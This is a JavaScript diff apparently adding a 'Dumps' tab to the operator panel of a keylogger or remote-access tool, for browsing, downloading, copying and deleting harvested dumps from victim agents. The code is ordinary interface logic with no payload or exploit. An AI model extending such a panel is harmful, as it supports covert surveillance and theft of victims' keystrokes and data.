@@ -12,6 +12,10 @@ let keyloggerActive = false;
 let selectedKeyloggerAgent = null;
 let logUpdateInterval = null;
 
+// Dumps Tab Functions
+let selectedDump = null;
+let currentCategory = 'keylogger';
+
 // Load keylogger state from localStorage
 function loadKeyloggerState() {
     try {
@@ -1334,4 +1338,268 @@ document.addEventListener('DOMContentLoaded', function() {
             startLogUpdates();
         }
     }
+});
+
+// Dumps Tab Functions
+function refreshDumps() {
+    fetch('/api/dumps', {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        const dumpsContainer = document.getElementById('dumps-items');
+        if (!dumpsContainer) return;
+
+        // Filter dumps by current category
+        const filteredDumps = data.filter(dump => dump.category === currentCategory);
+        
+        if (filteredDumps.length === 0) {
+            dumpsContainer.innerHTML = `
+                <div class="no-dumps">
+                    <p>No dumps available in this category</p>
+                </div>
+            `;
+            return;
+        }
+
+        dumpsContainer.innerHTML = filteredDumps.map(dump => `
+            <div class="dump-item ${selectedDump?.id === dump.id ? 'active' : ''}" 
+                 onclick="selectDump('${dump.id}')">
+                <div class="dump-item-header">
+                    <span class="dump-item-name">${dump.name}</span>
+                    <span class="dump-item-date">${formatDate(dump.timestamp)}</span>
+                </div>
+                <span class="dump-item-size">${formatFileSize(dump.size)}</span>
+            </div>
+        `).join('');
+    })
+    .catch(error => {
+        console.error('Error fetching dumps:', error);
+        const dumpsContainer = document.getElementById('dumps-items');
+        if (dumpsContainer) {
+            dumpsContainer.innerHTML = `
+                <div class="no-dumps">
+                    <p>Error loading dumps</p>
+                </div>
+            `;
+        }
+    });
+}
+
+function selectDump(dumpId) {
+    fetch(`/api/dumps/${dumpId}`, {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        selectedDump = data;
+        
+        // Update UI
+        document.querySelectorAll('.dump-item').forEach(item => {
+            item.classList.toggle('active', item.getAttribute('onclick').includes(dumpId));
+        });
+
+        const dumpContent = document.getElementById('dump-content');
+        const dumpTitle = document.querySelector('.dump-title');
+        const dumpDate = document.querySelector('.dump-date');
+
+        if (dumpContent && dumpTitle && dumpDate) {
+            dumpTitle.textContent = data.name;
+            dumpDate.textContent = formatDate(data.timestamp);
+            dumpContent.innerHTML = `<pre>${data.content}</pre>`;
+        }
+    })
+    .catch(error => {
+        console.error('Error loading dump:', error);
+        const dumpContent = document.getElementById('dump-content');
+        if (dumpContent) {
+            dumpContent.innerHTML = `
+                <div class="error-message">
+                    <p>Error loading dump content</p>
+                </div>
+            `;
+        }
+    });
+}
+
+function switchCategory(category) {
+    currentCategory = category;
+    selectedDump = null;
+    
+    // Update UI
+    document.querySelectorAll('.category').forEach(item => {
+        item.classList.toggle('active', item.dataset.category === category);
+    });
+
+    // Reset dump viewer
+    const dumpContent = document.getElementById('dump-content');
+    const dumpTitle = document.querySelector('.dump-title');
+    const dumpDate = document.querySelector('.dump-date');
+
+    if (dumpContent && dumpTitle && dumpDate) {
+        dumpTitle.textContent = 'No file selected';
+        dumpDate.textContent = '';
+        dumpContent.innerHTML = `
+            <div class="no-file-selected">
+                <span class="material-icons">description</span>
+                <p>Select a dump file to view its contents</p>
+            </div>
+        `;
+    }
+
+    // Refresh dumps list with new category
+    refreshDumps();
+}
+
+function downloadSelectedDump() {
+    if (!selectedDump) {
+        alert('No dump file selected');
+        return;
+    }
+
+    const link = document.createElement('a');
+    const blob = new Blob([selectedDump.content], { type: 'text/plain' });
+    link.href = URL.createObjectURL(blob);
+    link.download = selectedDump.name;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(link.href);
+}
+
+function copyDumpContent() {
+    if (!selectedDump) {
+        alert('No dump file selected');
+        return;
+    }
+
+    navigator.clipboard.writeText(selectedDump.content)
+        .then(() => {
+            // Show temporary success message
+            const button = document.querySelector('[onclick="copyDumpContent()"]');
+            const icon = button.querySelector('.material-icons');
+            const originalText = icon.textContent;
+            icon.textContent = 'check';
+            setTimeout(() => {
+                icon.textContent = originalText;
+            }, 2000);
+        })
+        .catch(err => {
+            console.error('Failed to copy text:', err);
+            alert('Failed to copy content to clipboard');
+        });
+}
+
+function deleteSelectedDump() {
+    if (!selectedDump) {
+        alert('No dump file selected');
+        return;
+    }
+
+    if (!confirm('Are you sure you want to delete this dump file?')) {
+        return;
+    }
+
+    fetch(`/api/dumps/${selectedDump.id}`, {
+        method: 'DELETE',
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            selectedDump = null;
+            refreshDumps();
+            // Reset dump viewer
+            const dumpContent = document.getElementById('dump-content');
+            const dumpTitle = document.querySelector('.dump-title');
+            const dumpDate = document.querySelector('.dump-date');
+
+            if (dumpContent && dumpTitle && dumpDate) {
+                dumpTitle.textContent = 'No file selected';
+                dumpDate.textContent = '';
+                dumpContent.innerHTML = `
+                    <div class="no-file-selected">
+                        <span class="material-icons">description</span>
+                        <p>Select a dump file to view its contents</p>
+                    </div>
+                `;
+            }
+        } else {
+            throw new Error(data.message || 'Failed to delete dump');
+        }
+    })
+    .catch(error => {
+        console.error('Error deleting dump:', error);
+        alert('Failed to delete dump file');
+    });
+}
+
+function clearAllDumps() {
+    if (!confirm('Are you sure you want to clear all dumps in this category?')) {
+        return;
+    }
+
+    fetch(`/api/dumps/clear/${currentCategory}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            selectedDump = null;
+            refreshDumps();
+            // Reset dump viewer
+            const dumpContent = document.getElementById('dump-content');
+            const dumpTitle = document.querySelector('.dump-title');
+            const dumpDate = document.querySelector('.dump-date');
+
+            if (dumpContent && dumpTitle && dumpDate) {
+                dumpTitle.textContent = 'No file selected';
+                dumpDate.textContent = '';
+                dumpContent.innerHTML = `
+                    <div class="no-file-selected">
+                        <span class="material-icons">description</span>
+                        <p>Select a dump file to view its contents</p>
+                    </div>
+                `;
+            }
+        } else {
+            throw new Error(data.message || 'Failed to clear dumps');
+        }
+    })
+    .catch(error => {
+        console.error('Error clearing dumps:', error);
+        alert('Failed to clear dumps');
+    });
+}
+
+// Initialize dumps tab when switching to it
+document.querySelector('[data-tab="dumps"]').addEventListener('click', () => {
+    refreshDumps();
+});
+
+// Add category switching functionality
+document.querySelectorAll('.category').forEach(category => {
+    category.addEventListener('click', () => {
+        switchCategory(category.dataset.category);
+    });
+});
+
+// Add search functionality
+document.getElementById('dumps-search')?.addEventListener('input', (e) => {
+    const searchTerm = e.target.value.toLowerCase();
+    document.querySelectorAll('.dump-item').forEach(item => {
+        const name = item.querySelector('.dump-item-name').textContent.toLowerCase();
+        item.style.display = name.includes(searchTerm) ? 'block' : 'none';
+    });
 }); 
